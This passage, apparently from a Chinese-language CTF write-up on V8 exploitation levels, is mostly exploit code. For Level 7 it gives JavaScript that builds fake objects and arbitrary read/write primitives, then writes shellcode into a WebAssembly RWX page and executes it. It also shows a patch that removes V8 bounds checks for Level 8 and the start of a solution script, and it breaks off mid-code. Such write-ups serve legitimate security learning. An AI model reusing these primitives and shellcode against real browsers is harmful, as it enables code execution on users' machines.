class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getfakeobject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> yes = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hit_me</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(yes)&#123;arr[<span class="number">2</span>] = &#123;&#125;&#125;;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">arr, i</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">0x100</span>;i++);</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">0x400</span> == <span class="number">0</span>)&#123;<span class="title function_">hit_me</span>();&#125;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x4000</span>;i++)&#123;<span class="title function_">opt</span>(arr, i)&#125;;</span><br><span class="line">    yes = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">opt</span>(arr, <span class="number">0x100000</span>)</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">console.log(get32addr(a).toString(16));</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="comment">b = getfakeobject(get32addr(a));</span></span><br><span class="line"><span class="comment">console.log(b);</span></span><br><span class="line"><span class="comment">b[1] = 13.37;</span></span><br><span class="line"><span class="comment">console.log(a);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="title function_">i2f</span>(<span class="number">0x31040404001c01b5n</span>), <span class="title function_">i2f</span>(<span class="number">0x0a0007ff11000844n</span>)]; <span class="comment">//fake a map: 0x31040404001c01b5	0x0a0007ff11000844</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ELEMENT_OFFSET</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">MAP_OFFSET</span> = <span class="number">0x24</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WASM_PAGE_SIZE</span> = <span class="number">0x2ccec</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//console.log(get32addr(arr).toString(16));</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">arr_element_addr = <span class="title function_">get32addr</span>(arr)-<span class="variable constant_">ELEMENT_OFFSET</span>; <span class="comment">//element</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr_element_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">fake_map_addr = arr_element_addr+<span class="number">0x64</span>; <span class="comment">//map, offset from begin</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fake_map_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">fake_array = [<span class="title function_">u2f</span>(fake_map_addr+<span class="number">1</span>, <span class="number">750</span>), <span class="title function_">u2f</span>(arr_element_addr+<span class="number">1</span>, <span class="number">100</span>)]; <span class="comment">//map, properties, elements, len, offset hack again :(</span></span><br><span class="line">fake_array_addr = <span class="title function_">get32addr</span>(fake_array);</span><br><span class="line"><span class="comment">//console.log(get32addr(fake_array).toString(16));</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_array)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fake_array_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">fake_obj = <span class="title function_">getfakeobject</span>(fake_array_addr+<span class="variable constant_">MAP_OFFSET</span>);</span><br><span class="line"><span class="comment">//console.log(fake_obj);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	addr -= <span class="number">8</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">	addr -= <span class="number">8</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = <span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*console.log(arr_element_addr.toString(16));</span></span><br><span class="line"><span class="comment">console.log(ArbRead64(arr_element_addr).toString(16));</span></span><br><span class="line"><span class="comment">ArbWrite64(arr_element_addr, 1);</span></span><br><span class="line"><span class="comment">console.log(ArbRead64(arr_element_addr).toString(16));*/</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="title function_">i2f</span>(<span class="number">0x9090909090909090n</span>),<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)];</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=(<span class="number">0x1d0000</span>/<span class="number">8</span>);i&lt;(<span class="number">0x1e0000</span>/<span class="number">8</span>);i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(((<span class="title class_">ArbRead64</span>(i*<span class="number">0x8</span>)&lt;&lt;<span class="number">32n</span>)&gt;&gt;<span class="number">32n</span>) == <span class="number">0x00000725001cdbe9</span>)&#123;</span><br><span class="line">        wasm_instance_addr = i*<span class="number">0x8</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(wasm_instance_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title class_">ArbRead64</span>(wasm_instance_addr+<span class="variable constant_">WASM_PAGE_SIZE</span>);</span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//for(let i=0x900;i&lt;0x1000;i++) console.log(`[*] $&#123;(0x1d0000+i*0x8).toString(16)&#125;: $&#123;ArbRead64(0x1d0000+i*0x8).toString(16)&#125;`)</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] WASM Instance ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//console.log(get32addr(wasm_instance));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">dataview.<span class="title function_">setFloat64</span>(<span class="number">0</span>, <span class="title function_">i2f</span>(<span class="number">0x1337133713371337n</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] BUF ADDR:&#x27;</span>);</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=(<span class="number">0xa0000</span>/<span class="number">8</span>);i&lt;(<span class="number">0xc0000</span>/<span class="number">8</span>);i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="title class_">ArbRead64</span>(i*<span class="number">0x8</span>)&gt;&gt;<span class="number">32n</span>)&lt;&lt;<span class="number">32n</span> == <span class="number">0x1337133700000000n</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>((i*<span class="number">0x8</span>).<span class="title function_">toString</span>(<span class="number">16</span>));buf_addr = i*<span class="number">0x8</span>+<span class="number">0x7630</span>;<span class="keyword">break</span>;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> backing_store_pointer = buf_addr + <span class="number">0x24</span>;</span><br><span class="line">backing_store_addr = <span class="title class_">ArbRead64</span>(backing_store_pointer);</span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="comment">//caculate full rwx addr</span></span><br><span class="line"><span class="comment">//console.log(&#x27;[*] RWX PAGE ADDR:&#x27;)</span></span><br><span class="line"><span class="comment">//console.log(rwx_page_addr.toString(16));</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//ArbWrite64(backing_store_pointer, backing_store_addr);</span></span><br><span class="line"><span class="title class_">ArbWrite64</span>(backing_store_pointer,rwx_page_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(backing_store_pointer).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_obj);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure>

<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p>進入 JIT 後去除了長度檢查， FREE OOB<br><strong>patch</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span><br><span class="line">index <span class="number">02</span>a53ebcc21.<span class="number">.006351</span>a3f08 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/simplified-lowering.cc</span><br><span class="line">+++ b/src/compiler/simplified-lowering.cc</span><br><span class="line">@@ <span class="number">-1888</span>,<span class="number">11</span> +<span class="number">1888</span>,<span class="number">11</span> @@ <span class="class"><span class="keyword">class</span> <span class="title">RepresentationSelector</span> &#123;</span></span><br><span class="line">         <span class="keyword">if</span> (lower&lt;T&gt;()) &#123;</span><br><span class="line">           <span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">-               index_type.Max() &lt; length_type.Min())) &#123;</span><br><span class="line">+               index_type.Min() &lt; length_type.Min())) &#123;</span><br><span class="line">             <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">             <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">             <span class="comment">// TODO(neis): Move this into TypedOptimization?</span></span><br><span class="line">-            <span class="keyword">if</span> (v8_flags.turbo_typer_hardening) &#123;</span><br><span class="line">+            <span class="keyword">if</span> (<span class="literal">false</span> <span class="comment">/*v8_flags.turbo_typer_hardening*/</span>) &#123;</span><br><span class="line">               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               DeferReplacement(node, NodeProperties::GetValueInput(node, <span class="number">0</span>));</span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index facf0d86d79.<span class="number">.382</span>c015bc48 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-3364</span>,<span class="number">7</span> +<span class="number">3364</span>,<span class="number">7</span> @@ Local&lt;FunctionTemplate&gt; <span class="title function_">Shell::CreateNodeTemplates</span><span class="params">(</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span><br><span class="line"><span class="params">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span></span><br><span class="line"><span class="params">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="params">+<span class="comment">/*  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span></span><br><span class="line"><span class="comment"><span class="params">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;version&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">                        FunctionTemplate::New(isolate, Version));</span></span></span><br><span class="line"><span class="comment"><span class="params">@@ -3385,13 +3385,13 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">                        FunctionTemplate::New(isolate, ReadLine));</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;load&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span></span><br><span class="line"><span class="comment"><span class="params">+                       FunctionTemplate::New(isolate, ExecuteFile));*/</span></span></span><br><span class="line"><span class="params">   global_template-&gt;Set(isolate, <span class="string">&quot;setTimeout&quot;</span>,</span></span><br><span class="line"><span class="params">                        FunctionTemplate::New(isolate, SetTimeout));</span></span><br><span class="line"><span class="params">   <span class="comment">// Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span></span></span><br><span class="line"><span class="params">   <span class="comment">// call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span></span></span><br><span class="line"><span class="params">   <span class="comment">// we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span></span></span><br><span class="line"><span class="params">-  <span class="keyword">if</span> (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="params">+<span class="comment">/*  if (!options.omit_quit) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span></span><br><span class="line"><span class="comment"><span class="params">   &#125;</span></span></span><br><span class="line"><span class="comment"><span class="params">   global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">@@ -3410,7 +3410,7 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">   if (i::v8_flags.expose_async_hooks) &#123;</span></span></span><br><span class="line"><span class="comment"><span class="params">     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span></span><br><span class="line"><span class="comment"><span class="params">                          Shell::CreateAsyncHookTemplate(isolate));</span></span></span><br><span class="line"><span class="comment"><span class="params">-  &#125;</span></span></span><br><span class="line"><span class="comment"><span class="params">+  &#125;*/</span></span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">   <span class="keyword">return</span> global_template;</span></span><br><span class="line"><span class="params"> &#125;</span></span><br></pre></td></tr></table></figure>

<p><del>但我還是卡了好久，最後看別人 Exploit 才知道要讓</del>輸入的 index 是 SMI，所以要上類似 <code>i = i &amp; 0XFFFFFFF</code> 的東西讓 v8 相信他是 smi<br>後面就是達成 oob 即可，記得算算 offset，跟前面一樣？<br>oob 後就是直接 aab, aar，可能會想說會不會想 level 7 一樣要自幹掃描但答案是不會🎉，因為 aab, aar 和 getaddr 太好用了所以都用兩次就好w<br>opt 函數和 Debug 技巧(假裝已經進入 JIT)<br>原則上會比較好算 OFFSET w  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> trojan_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="comment">//%DebugPrint(trojan_arr);</span></span><br><span class="line">    <span class="comment">//%DebugPrint(array);</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(opt);</span><br></pre></td></tr></table></figure>
<p>最後就是實踐上我發現不知道為什麼我這邊 JIT 一定要 console.log 一堆垃圾才會真得進去…卡好久， debug 也更難用 QwQ  </p>
<p><strong>sol.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2ul</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2uh</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span 